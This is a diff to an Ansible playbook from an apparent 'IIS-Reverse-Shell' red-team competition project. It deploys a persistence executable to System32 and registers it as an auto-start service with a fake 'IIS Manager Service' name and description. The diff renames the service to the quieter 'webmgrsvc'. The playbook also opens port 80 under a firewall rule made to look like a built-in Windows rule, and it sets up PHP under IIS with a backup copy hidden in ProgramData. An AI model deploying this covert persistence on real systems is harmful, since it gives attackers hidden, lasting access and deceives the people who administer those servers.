@@ -88,7 +88,7 @@
       
     - name: Deploys Persistence Executable
       win_copy:
-        src: "~/IIS-Reverse-Shell/Persistence/IIS Manager Service.exe"
+        src: "~/IIS-Reverse-Shell/Persistence/IISManagerService.exe"
         dest: "C:\\Windows\\System32"
      
     - name: Creates Competition Variable Registry Key
@@ -99,40 +99,32 @@
         type: string
         
     - name: Adds Executable to Services
-      win_shell:  New-Service -Name "IIS Manager Service" -Binary "C:\Windows\System32\IIS Manager Service.exe" -DisplayName "IIS Manager Service" -Description "This service is an integrated IIS component that optimizes and secures web server connections by dynamically regulating inbound traffic." -StartupType Automatic
+      win_shell:  New-Service -Name "webmgrsvc" -Binary "C:\Windows\System32\IISManagerService.exe" -DisplayName "IIS Manager Service" -Description "This service is an integrated IIS component that optimizes and secures web server connections by dynamically regulating inbound traffic." -StartupType Automatic
         
     - name: Starts Service
       win_service:
-        name: "IIS Manager Service"
+        name: "webmgrsvc"
         state: started
       ignore_errors: yes
       
-     - name: Check if firewall rule is enabled or not, and enable it if necessary
-      ansible.windows.win_shell: |
+    - name: Check if firewall rule is enabled or not, and enable it if necessary
+      win_shell: |
         $existingRule = Get-NetFirewallRule | Where-Object { 
             $_.DisplayName -eq 'Core Networking - IPHTTP (TCP-In)' 
         };
         if ($existingRule) { 
             if ($existingRule.Enabled -eq 'False') {
-                # Enable the rule if it's found but disabled
                 Set-NetFirewallRule -DisplayName 'Core Networking - IPHTTP (TCP-In)' -Enabled True
             }
         } else {
-            # Create the rule if it doesn't exist
-            New-NetFirewallRule -DisplayName 'Core Networking - IPHTTP (TCP-In)' `
-                                -Direction Inbound `
-                                -Protocol TCP `
-                                -Action Allow `
-                                -LocalPort 80 `
-                                -Group 'Core Networking Optimization' `
-                                -Description 'Inbound TCP rule to allow IPHTTP tunneling technology to provide connectivity across HTTP proxies and firewalls.'
+            New-NetFirewallRule -DisplayName 'Core Networking - IPHTTP (TCP-In)' -Direction Inbound -Protocol TCP -Action Allow -LocalPort 80 -Group 'Core Networking Optimization' -Description 'Inbound TCP rule to allow IPHTTP tunneling technology to provide connectivity across HTTP proxies and firewalls.'
         }
         
     - name: Downloads PHP
       win_get_url:
         url: "https://windows.php.net/downloads/releases/php-8.4.5-nts-Win32-vs17-x64.zip"
         dest: "C:\\Program Files\\php.zip"
-
+        
     - name: Extracts PHP to Program Files
       win_unzip:
         src: "C:\\Program Files\\php.zip"
@@ -153,9 +145,12 @@
     - name: Copies PHP Files to a Backup Location
       win_shell: Copy-Item -Path "C:\Program Files\PHP" -Destination "C:\ProgramData\Microsoft\PHP" -Recurse -Force
 
-    - name: Configures FastCGI Handler for PHP
+    - name: Configures FastCGI Handler for PHP at site level
       win_shell: |
-        if (-not (Get-WebHandler | Where-Object { $_.Name -eq "PHP_via_FastCGI" })) { New-WebHandler -Name "PHP_via_FastCGI" -Path "*.php" -Verb "*" -Module "FastCgiModule" -ScriptProcessor "C:\Program Files\PHP\php-cgi.exe" }
+       $siteName = "{{ Competition }}"
+       if (-not (Get-WebHandler -pspath "MACHINE/WEBROOT/SITES/$siteName" | Where-Object { $_.Name -eq "PHP_via_FastCGI" })) {
+         New-WebHandler -pspath "MACHINE/WEBROOT/SITES/$siteName" -Name "PHP_via_FastCGI" -Path "*.php" -Verb "*" -Modules "FastCgiModule" -ScriptProcessor "C:\Program Files\PHP\php-cgi.exe"
+       }
       
     - name: Set FastCGI Path for PHP
       win_shell: |
